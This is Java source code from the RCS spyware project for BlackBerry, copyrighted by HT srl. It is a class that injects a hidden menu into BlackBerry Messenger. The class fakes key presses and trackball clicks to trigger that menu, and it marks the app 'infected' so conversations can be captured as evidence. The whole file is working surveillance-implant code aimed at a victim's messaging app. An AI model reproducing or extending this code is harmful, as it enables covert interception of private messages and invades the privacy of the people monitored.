//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	

package blackberry.agent.im;

import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.ui.UiApplication;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.injection.AppInjectorInterface;
import blackberry.injection.KeyInjector;
import blackberry.interfaces.Singleton;
import blackberry.utils.Utils;

/**
 * Free letters: qwrtyudfgjklzbnm
 * bbm
 * @author zeno
 *
 */
public class AppInjectorBBM implements AppInjectorInterface, Singleton {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AppInjectorBBM", DebugLevel.VERBOSE);
    //#endif

    private static AppInjectorBBM instance;
    private static final long GUID = 0xcb37fa94a62baf5dL;
    private static final int DELAY = 5000;

    private static final int MAX_TRIES = 12;
    
    private int delay = 100;
    private int tries =0;

    public static synchronized AppInjectorBBM getInstance() {
        if (instance == null) {
            instance = (AppInjectorBBM) RuntimeStore.getRuntimeStore()
                    .get(GUID);
            if (instance == null) {
                final AppInjectorBBM singleton = new AppInjectorBBM();

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    BBMMenuItem menu = BBMMenuItem.getInstance();

    public boolean requestForeground() {
        return false;
    }

    public boolean injectMenu() {
        //#ifdef DEBUG
        debug.trace("injectMenu");
        //#endif
        menu.addMenuBBM("Yield");
        return true;
    }

    public boolean deleteMenu() {
        //#ifdef DEBUG
        debug.trace("deleteMenu");
        //#endif
        menu.removeMenuBBM();
        return true;
    }

    public boolean callMenuByKey() {
        //#ifdef DEBUG
        debug.info("calling bbm menu: "
                + UiApplication.getUiApplication().getActiveScreen());
        //#endif

        if(tries >= MAX_TRIES){
            //#ifdef DEBUG
            debug.error("callMenuByKey: too many tries");
            //#endif
            if(tries++ == MAX_TRIES){
                Evidence.info("NO BBM");
            }
            return false;
        }

        //#ifdef DEBUG
        debug.trace("callMenuByKey press raw key");
        //#endif
        KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
        Utils.sleep(delay + tries * 20);
        KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
        Utils.sleep(delay + tries * 20);
        KeyInjector.trackBallRawClick();

        return true;
    }

    public String getAppName() {

        return "Messenger";
    }

    public void callMenuInContext() {
        //#ifdef DEBUG
        debug.trace("callMenuInContext");
        //#endif
        BBMMenuItem.getInstance().checkForConversationScreen();

    }

    boolean infected;

    public boolean isInfected() {

        return infected;
    }

    public void setInfected() {
        Evidence.info("BBM");
        infected = true;
    }

    public int getDelay() {

        return DELAY;
    }

    public void reset() {
        tries = 0;
    }

}
